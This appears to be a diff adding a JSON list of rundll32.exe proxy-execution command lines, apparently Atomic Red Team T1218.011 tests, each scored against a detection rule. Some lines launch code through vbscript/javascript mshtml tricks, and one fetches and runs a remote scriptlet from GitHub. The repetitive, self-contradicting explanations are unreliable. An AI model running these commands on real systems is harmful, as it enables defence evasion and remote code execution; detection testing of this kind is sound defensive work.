@@ -1,0 +1,36 @@
+```json
+[
+  {
+    "output": "\"C:\\Windows\\System32\\RUNDLL32.EXE\" -sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (none) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\system32\\rundll32.exe\" -sta AtomicTest",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (none) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\system32\\rundll32.exe\" C:\\Users\\thaim\\Downloads\\calc.png StartW",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (.png) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\system32\\rundll32.exe\" keymgr,KRShowKeyMgr",
+    "explanation": "This command uses rundll32.exe with a common DLL and is filtered by the rule. It is not a valid test case for bypassing the rule."
+  },
+  {
+    "output": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (none) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "output": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (none) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "output": "rundll32.exe C:\\AtomicRedTeam\\atomics\\T1218.011\\bin\\_WT.init,krnl",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (.init) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "output": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+    "explanation": "This command uses rundll32.exe with an uncommon extension (none) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
+  },
+  {
+    "
